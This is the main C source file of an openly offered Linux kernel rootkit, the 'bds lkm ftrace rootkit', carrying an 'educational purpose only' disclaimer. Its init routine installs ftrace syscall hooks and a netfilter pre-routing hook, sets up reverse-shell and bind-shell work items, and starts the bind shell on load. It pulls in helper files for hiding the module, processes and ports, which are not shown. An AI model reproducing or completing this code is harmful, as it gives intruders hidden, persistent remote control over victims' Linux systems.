/*
bds lkm ftrace rootkit 

Simple  LKM Rootkit for linux kernel 5.x and 6.x on x86_64

Hook syscall using ftrace

developed by : Antonius (Antonius Robotsoft)

website : www.bluedragonsec.com

github : https://github.com/bluedragonsecurity

twitter : https://twitter.com/bluedragonsec

to install rootkit, read readme.txt

Warning!! This rootkit is for educational purpouse only! I am not       
responsible to anything you do with this !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*

*/

#include "includes/bds_headers.h"
#include "includes/bds_vars.h"
#include "includes/bds_structs.h"
#include "includes/bds_utils.c"
#include "includes/bds_hide.c"
#include "includes/bds_ftrace.h"
#include "includes/bds_getdents.c"
#include "includes/bds_kill.c"
#include "includes/bds_netfilter.c"
#include "includes/bds_hide_port.c"
#include "includes/bds_ftrace_hooks.c"

static int bds_start(void) {
	int err;
	
	//bds_hide();
        
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	
	nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
	nfho->hook  = (nf_hookfn*)bds_nf_hook;      
	nfho->hooknum   = NF_INET_PRE_ROUTING;     
	nfho->pf    = PF_INET;          
	nfho->priority  = NF_IP_PRI_FIRST;      
	nf_register_net_hook(&init_net, nfho);
	INIT_WORK(&do_umode_exec, bds_reverse_shell);
        INIT_WORK(&do_work_bind, bds_bindshell);
	schedule_work(&do_work_bind);
	
	return 0;
}

static void bds_end(void) {
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	nf_unregister_net_hook(&init_net, nfho);
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Antonius - www.bluedragonsec.com");
module_init(bds_start);
module_exit(bds_end);
